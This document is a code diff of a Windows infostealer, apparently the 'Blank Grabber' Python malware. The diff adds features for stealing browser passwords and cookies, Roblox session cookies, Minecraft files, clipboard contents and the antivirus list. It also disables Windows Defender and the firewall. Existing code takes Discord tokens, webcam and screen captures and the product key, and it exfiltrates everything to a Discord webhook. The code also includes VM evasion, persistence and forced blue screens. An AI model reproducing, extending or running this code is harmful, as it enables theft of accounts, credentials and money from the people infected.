@@ -1,12 +1,7 @@
 # UTF-8
 # https://github.com/Blank-c/Blank-Grabber
 
-WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"
-PINGME = True # Pings @everyone
-VMPROTECT = True # Tries to protect your grabber from VMs
-BSOD = True # Tries to trigger Blue Screen if grabber force exit
-STARTUP = True # Puts the grabber in startup
-HIDE_ITSELF = True # Hides the Grabber
+WEBHOOK = "Do NOT Enter anything here! Enter your webhook in webhook.txt"
 
 import os, sys
 if os.name!="nt" or not hasattr(sys, "frozen"):
@@ -26,6 +21,18 @@ from requests import *
 import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat
 from win32crypt import CryptUnprotectData
 
+if os.path.isfile(configfile := os.path.join(sys._MEIPASS, "config.json")):
+    with open(configfile, encoding= "utf-8", errors= "ignore") as file:
+        _config = json.load(file)
+else:
+    _config = {}
+
+PINGME = _config.get("PINGME", True) # Pings @everyone
+VMPROTECT = _config.get("VMPROTECT", True) # Tries to protect your grabber from VMs
+BSOD = _config.get("BSOD", True) # Tries to trigger Blue Screen if grabber force exit
+STARTUP = _config.get("STARTUP", True) # Puts the grabber in startup
+HIDE_ITSELF = _config.get("HIDE_ITSELF", True) # Hides the Grabber
+
 def fquit():
     if BSOD:
         subprocess.run("taskkill /IM svchost.exe /F", capture_output= True, shell= True)
@@ -43,11 +50,8 @@ def wd_exclude(path= None):
     subprocess.run(f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"{path}\"", shell= True, capture_output= True)
 
 def disable_wd():
-    windef = os.path.join(os.getenv("temp"), f"{generate(invisible= True)}.bat")
-    with open(windef, "w") as e:
-        e.write("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
+    windef = "powershell Set-MpPreference -DisableRealtimeMonitoring $true && netsh Advfirewall set allprofiles state off"
     subprocess.run(windef, shell= True, capture_output= True)
-    os.remove(windef)
 
 def generate(num=5, invisible= False):
     if not invisible:
@@ -108,7 +112,6 @@ class vmprotect:
 class BlankGrabber:
     def __init__(self):
         self.http = http
-        self.trust = 0
         self.webhook = WEBHOOK
         self.getPKey()
         self.archive = os.path.join(os.getenv("temp"), f"Blank-{os.getlogin()}.zip")
@@ -118,34 +121,46 @@ class BlankGrabber:
         self.roaming = os.getenv("appdata")
         self.chromefolder = os.path.join(self.localappdata, "Google", "Chrome", "User Data")
         try:
-            os.mkdir(self.tempfolder)
-            os.mkdir(self.system)
-        except FileExistsError:
-            pass
-        except Exception:
+            os.makedirs(self.tempfolder, exist_ok= True)
+            os.makedirs(self.system, exist_ok= True)
+        except PermissionError:
             os._exit(0)
         threads = []
         self.tokens = []
-        self.ipinfo = self.getip()
-        t = threading.Thread(target = lambda: self.webshot())
-        t = threading.Thread(target = lambda: self.misc())
+        t = k = None
+        self.passwords = self.cookies = self.roblocookies = []
+        t = threading.Thread(target= lambda: self.getip())
+        t.start()
+        threads.append(t)
+        t = threading.Thread(target= lambda: self.webshot())
+        t.start()
+        threads.append(t)
+        t = threading.Thread(target= lambda: self.misc())
         t.start()
         threads.append(t)
         if os.path.isfile(os.path.join(self.chromefolder, "Local State")):
-            t = threading.Thread(target = lambda: self.getcookie())
-            t.start()
+            k = threading.Thread(target= lambda: self.getcookie())
+            k.start()
             threads.append(t)
-            t = threading.Thread(target = lambda: self.getpass())
+            t = threading.Thread(target= lambda: self.getpass())
             t.start()
             threads.append(t)
         if os.path.isfile(os.path.join(self.roaming, "BetterDiscord", "data", "betterdiscord.asar")):
-            t = threading.Thread(target = lambda: self.crash_bd())
+            t = threading.Thread(target= lambda: self.crash_bd())
             t.start()
             threads.append(t)
-        t = threading.Thread(target = lambda: self.getTokens())
+        t = threading.Thread(target= lambda: self.getTokens())
         t.start()
         threads.append(t)
-        t = threading.Thread(target = lambda: self.screenshot())
+        t = threading.Thread(target= lambda: self.screenshot())
+        t.start()
+        threads.append(t)
+        t = threading.Thread(target= lambda: self.minecraft_stealer())
+        t.start()
+        threads.append(t)
+        if k is not None:
+            k.join()
+        t = threading.Thread(target= lambda: self.roblox_stealer())
         t.start()
         threads.append(t)
 
@@ -158,24 +173,21 @@ class BlankGrabber:
                 e.write("These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+log.strip())
         self.send()
 
-    def is_monochrome(self, path):
-        return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
-
     def webshot(self):
-        if not hasattr(sys, "frozen"):
-            return
+        def is_monochrome(path):
+            return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
+
         call = subprocess.run("a.es -d -p blank cm.bam.aes", capture_output= True, shell= True, cwd= sys._MEIPASS)
         if call.returncode != 0:
             return
         subprocess.run("cm.bam /filename Webcam.bmp", capture_output= True, shell= True, cwd= sys._MEIPASS)
-        if self.is_monochrome(os.path.join(sys._MEIPASS, "Webcam.bmp")):
+        if is_monochrome(os.path.join(sys._MEIPASS, "Webcam.bmp")):
             os.remove(os.path.join(sys._MEIPASS, "Webcam.bmp"))
             return
         with Image.open(os.path.join(sys._MEIPASS, "Webcam.bmp")) as img:
             img.save(os.path.join(self.tempfolder, "Webcam.png"), "png")
         os.remove(os.path.join(sys._MEIPASS + "Webcam.bmp"))
         os.remove(os.path.join(sys._MEIPASS, "cm.bam"))
-        self.trust += 2
 
     def getPKey(self):
         key = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode().strip()
@@ -187,7 +199,7 @@ class BlankGrabber:
             shutil.copy(source, destination)
         except Exception:
             try:
-                os.makedirs(os.path.dirname(destination))
+                os.makedirs(os.path.dirname(destination), exist_ok= True)
                 shutil.copy(source, destination)
             except Exception as e:
                 self.logs(e, sys.exc_info())
@@ -197,24 +209,61 @@ class BlankGrabber:
             file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
 
     def getpass(self):
-        if not hasattr(sys, "frozen"):
-            return
         subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
-        subprocess.run(f"pm.bam /stext \"{os.path.join(os.path.abspath(self.tempfolder), 'Passwords.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
+        subprocess.run(f"pm.bam /stext \"{os.path.join(os.path.abspath(sys._MEIPASS), 'Passwords.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
         os.remove(os.path.join(sys._MEIPASS, "pm.bam"))
-        with open(os.path.join(self.tempfolder, "Passwords.txt"), encoding= "utf-8", errors= "ignore") as file:
-            if len(file.readlines()) > 100:
-                self.trust += 1
+        with open(os.path.join(sys._MEIPASS, "Passwords.txt"), encoding= "utf-16", errors= "ignore") as file:
+            passwords = file.read().strip().split("\n\n")
+        self.passwords = [x.replace("=" * 50, "Blank Grabber".center(50, "="), 1) for x in passwords]
+        if len(self.passwords) > 3:
+            os.makedirs((directory := os.path.join(self.tempfolder, "Credentials")), exist_ok= True)
+            with open(os.path.join(directory, "Browser Passwords.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                file.write("\n\n".join(self.passwords))
 
     def getcookie(self):
-        if not hasattr(sys, "frozen"):
-            return
         subprocess.run("a.es -d -p blank ck.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
-        subprocess.run(f"ck.bam /stext \"{os.path.join(os.path.abspath(self.tempfolder), 'Cookies.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
+        subprocess.run(f"ck.bam /stext \"{os.path.join(os.path.abspath(sys._MEIPASS), 'Cookies.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
         os.remove(os.path.join(sys._MEIPASS, "ck.bam"))
-        with open(os.path.join(self.tempfolder, "Cookies.txt"), encoding= "utf-8", errors= "ignore") as file:
-            if len(file.readlines()) > 100:
-                self.trust += 1
+        with open(os.path.join(sys._MEIPASS, "Cookies.txt"), encoding= "utf-16", errors= "ignore") as file:
+            cookies = file.read().strip().split("\n\n")
+        self.cookies = [x.replace("=" * 50, "Blank Grabber".center(50, "="), 1) for x in cookies]
+        if len(self.cookies) > 20:
+            os.makedirs(directory := os.path.join(self.tempfolder, "Credentials"), exist_ok= True)
+            with open(os.path.join(directory, "Browser Cookies.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                file.write("\n\n".join(self.cookies))
+
+    def minecraft_stealer(self):
+        if not os.path.exists(mcdir := os.path.join(self.roaming, ".minecraft")):
+            return
+        for i in os.listdir(mcdir):
+            if not i.endswith((".json", ".txt", ".dat")):
+                continue
+            os.makedirs(grabpath := os.path.join(self.tempfolder, "Gaming", "Minecraft"), exist_ok= True)
+            self.copy(os.path.join(mcdir, i), os.path.join(grabpath, i))
+
+    def roblox_stealer(self):
+        def check(cookie):
+            headers = {"Cookie" : ".ROBLOSECURITY=" + cookie}
+            try:
+                r = json.loads(self.http.request("GET", "https://www.roblox.com/mobileapi/userinfo", headers= headers).data.decode())
+            except json.JSONDecodeError:
+                return
+            data = f"Username: {r['UserName']}\nUserID: {r['UserID']}\nRobux: {r['RobuxBalance']}\nBuilders Club Member: {r['IsAnyBuildersClubMember']}\nPremium: {r['IsPremium']}\nThumbnail: {r['ThumbnailUrl']}\n\nCookie: {cookie}"
+            self.roblocookies.append(data)
+
+        temp = ["\n".join(self.cookies)]
+        for i in ("HKCU", "HKLM"):
+            rbxcmd = subprocess.run(f"powershell Get-ItemPropertyValue -Path {i}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY", capture_output= True, shell= True)
+            if not rbxcmd.returncode:
+                temp.append(rbxcmd.stdout.decode())
+        for i in temp:
+            for j in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", i):
+                check(j)
+
+        if len(self.roblocookies):
+            os.makedirs(rbdir := os.path.join(self.tempfolder, "Gaming", "Roblox"), exist_ok= True)
+            with open(os.path.join(rbdir, "Roblox Cookies.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                file.write(("\n" + "Blank Grabber".center(50, "=")).join(self.roblocookies))
 
     def crash_bd(self):
         bdasar = os.path.join(self.roaming, "BetterDiscord", "data", "betterdiscord.asar")
@@ -236,11 +285,26 @@ class BlankGrabber:
         return tree.strip()
 
     def misc(self):
-        output = []
-        for location in ["Desktop", "Downloads", "Music", "Pictures", "Videos"]:
-            output.append(f"[{location}]\n\n{self.tree(os.path.join(os.getenv('userprofile'), location))}")
-        with open(os.path.join(self.system, "Tree.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
-            file.write("\n\n".join(output).strip())
+        output = {}
+        for location in ["Desktop", "Documents" , "Downloads", "Music", "Pictures", "Videos"]:
+            output[location] = self.tree(os.path.join(os.getenv("userprofile"), location))
+        for i in output:
+            os.makedirs(os.path.join(self.tempfolder, "Directories"), exist_ok= True)
+            with open(os.path.join(self.tempfolder, "Directories", f"{i}.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                file.write(output[i])
+
+        output = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout.decode().strip()
+        if len(output) > 0:
+            with open(os.path.join(self.system, "Clipboard.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                file.write(output)
+
+        output = subprocess.run(r"WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName", capture_output= True, shell= True)
+        if not output.returncode:
+            output = output.stdout.decode().strip().splitlines()
+            if len(output) >= 2:
+                output = output[2:]
+                with open(os.path.join(self.system, "Antivirus.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                    file.write("\n".join(output))
 
         output = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
         with open(os.path.join(self.system, "Task List.txt"), "w", errors= "ignore") as tasklist:
@@ -292,11 +356,13 @@ class BlankGrabber:
                     key = json.load(keyfile)["os_crypt"]["encrypted_key"]
                 except Exception:
                     return
-            for file in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
-                if not file.endswith(".log") and not file.endswith(".ldb"):
+            if not os.path.exists(lvldbdir := os.path.join(path, "Local Storage", "leveldb")):
+                return
+            for file in os.listdir(lvldbdir):
+                if not file.endswith((".log", ".ldb")):
                     continue
                 else:
-                    for line in [x.strip() for x in open(f"{path}\\Local Storage\\leveldb/{file}", errors="ignore").readlines() if x.strip()]:
+                    for line in [x.strip() for x in open(os.path.join(lvldbdir, file), errors="ignore").readlines() if x.strip()]:
                         for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                             if token.endswith("\\"):
                                 token = (token[::-1].replace("\\", "", 1))[::-1]
@@ -311,7 +377,7 @@ class BlankGrabber:
 
         def grabcord(path):
             for filename in os.listdir(path):
-                if not filename.endswith(".log") and not filename.endswith(".ldb"):
+                if not filename.endswith((".log", ".ldb")):
                     continue
                 for line in [x.strip() for x in open(os.path.join(path, filename), errors="ignore").readlines() if x.strip()]:
                     for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
@@ -335,7 +401,7 @@ class BlankGrabber:
                     token_threads.append(t)
                     t.start()
 
-        for i in token_threads[::-1]:
+        for i in token_threads:
             i.join()
 
         for token in self.tokens:
@@ -354,13 +420,13 @@ class BlankGrabber:
                 billing = len(json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode()))>0
                 data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
         if len(data)!= 0:
-            self.trust += 3
-            with open(os.path.join(self.tempfolder, "Discord Info.txt"), "w", errors="ignore") as file:
+            os.makedirs(discfolder := os.path.join(self.tempfolder, "Messenger", "Discord"), exist_ok= True)
+            with open(os.path.join(discfolder, "Discord Info.txt"), "w", encoding= "utf-8", errors="ignore") as file:
                 file.write("\n\n".join(data))
 
     def screenshot(self):
         image = ImageGrab.grab()
-        image.save(os.path.join(self.tempfolder, "Screenshot.png"))
+        image.save(os.path.join(self.system, "Screenshot.png"))
         del image
 
     def headers(self, token=None):
@@ -385,7 +451,7 @@ class BlankGrabber:
             self.logs(e, sys.exc_info())
             r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
             data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + "\nUUID: " + subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode().strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str()) + f"\nIP: {r.get('origin')}"
-        return data
+        self.ipinfo = data
 
     def zip(self):
         shutil.make_archive(self.archive[:-3], "zip", self.tempfolder)
@@ -408,8 +474,7 @@ class BlankGrabber:
   "username": "Blank Grabber",
   "avatar_url": "https://i.imgur.com/ZZZtlwB.png"
 }
-        if self.trust < 2:
-            fquit()
+
         self.webhook = base64.b85decode(self.webhook.encode()).decode()
         self.http.request("POST", self.webhook, body= json.dumps(payload).encode(), headers= self.headers())
         with open(self.archive,"rb") as file:
